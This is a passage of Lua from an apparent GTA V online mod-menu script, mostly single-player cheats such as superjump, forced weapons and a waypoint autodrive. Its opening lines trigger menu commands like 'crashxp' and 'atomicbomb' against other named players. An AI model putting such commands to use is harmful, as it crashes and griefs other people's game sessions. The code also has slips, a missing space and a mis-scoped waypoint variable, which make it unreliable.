            menu.trigger_commands("windmills " .. players.get_name(pid).." off")
            menu.trigger_commands("randomloop " .. players.get_name(pid).." off")
            menu.trigger_commands("atomicbomb " .. players.get_name(pid).." off")
            menu.trigger_commands("crashxp " .. players.get_name(pid))
            menu.trigger_commands("togglefragv1 " .. players.get_name(pid).."off")
        end
    end)

end

    players.on_join(playerActionsSetup)

    players.dispatch_on_join()

local smartAutoDriveData = {
    paused = false,
    lastSetTask = 0,
    lastWaypoint = nil
}
local MOVEMENT_CONTROLS = table.freeze({
    59, 60, 61, 62, 63, 64, 71, 72, 75, 76, 87, 88, 89, 90, 102, 106, 107, 108, 109, 110, 111, 112, 113, 122, 126, 127, 128, 129, 130, 131, 132, 133, 134, 135, 136, 137, 138, 139
})
local autodriveDriver = 0

    

local last_car = 0
            while true do
                player_cur_car = entities.get_user_vehicle_as_handle()
                if last_car ~= player_cur_car and player_cur_car ~= 0 then 
                    on_user_change_vehicle(player_cur_car)
                    last_car = player_cur_car
                end
            

                if superjump then

                    if PAD.IS_CONTROL_PRESSED(1, 22) then

                        ENTITY.APPLY_FORCE_TO_ENTITY(players.user_ped(), 1, 0.0, 0.0, 1.5, 0.0, 0.0, 0.0, 0, true, true, true, false, true)

                    end

                end

                if homer then

                    if PAD.IS_CONTROL_PRESSED(1, 21) then

                        menu.trigger_command(menu.ref_by_path("Game>Rendering>Shader Override>AirRaceBoost02"))

                    else

                        menu.trigger_command(menu.ref_by_path("Game>Rendering>Shader Override>Don't Override"))

                    end

                end 

                if bigbarrelqq then
                    if (HUD.HUD_GET_WEAPON_WHEEL_CURRENTLY_HIGHLIGHTED(plyped()) ~= -1810795771) then
                    WEAPON.GIVE_WEAPON_TO_PED(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(players.user()),-1810795771,15,true,true)
                end
            end

            if zhengyi then 
                directx.draw_texture(zhengyipng, 0.29, 0.1, 0.0, 0.0, 0.23, 0.0, 0, 1, 1, 1, 1)
            end

                local my_ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(players.user())
                local my_vehicle = PED.GET_VEHICLE_PED_IS_IN(my_ped, false)

                if smartAutodrive and my_vehicle > 0 then
                    if smartAutoDriveData.paused then
                        if ENTITY.GET_ENTITY_SPEED(my_vehicle) <= 15 then
                            smartAutoDriveData.paused = false
                        end
                    else
                        for _, control in ipairs(MOVEMENT_CONTROLS) do
                            if PAD.IS_CONTROL_PRESSED(2, control) then
                                TASK.CLEAR_PED_TASKS(my_ped)
                                smartAutoDriveData.paused = true
                                break
                            end
                        end
                        if not smartAutoDriveData.paused then
                            local waypoint = get_waypoint_pos(nil, true)
                            if waypoint then
                                lastWaypoint = waypoint
                                local model = ENTITY.GET_ENTITY_MODEL(my_vehicle)
                                local now = MISC.GET_GAME_TIMER()
                                if now - smartAutoDriveData.lastSetTask > 5000 then
                                    PED.SET_DRIVER_ABILITY(my_ped, 1.0)
                                    PED.SET_DRIVER_AGGRESSIVENESS(my_ped, 0.6)
                                    TASK.TASK_VEHICLE_DRIVE_TO_COORD(my_ped, my_vehicle, waypoint.x, waypoint.y, waypoint.z, 100, 5, model, 787004, 15.0, 1.0)
                                    smartAutoDriveData.lastSetTask = now
                                end
                            elseif smartAutoDriveData.lastWaypoint then
                                if ENTITY.IS_ENTITY_AT_COORD(my_vehicle, smartAutoDriveData.lastWaypoint.x, smartAutoDriveData.lastWaypoint.y, smartAutoDriveData.lastWaypoint.z, 10.0, 10.0, 10.0, 0, 1, 0) then
                                    smartAutoDriveData.lastWaypoint = nil
                                    smartAutoDriveData.paused = true
                                    VEHICLE.BRING_VEHICLE_TO_HALT(my_vehicle, 5.0, 1)
                                    TASK.CLEAR_PED_TASKS(my_ped)
                                end
                            end
                        end
                    end

                util.yield()

            end 

        util.yield()

end
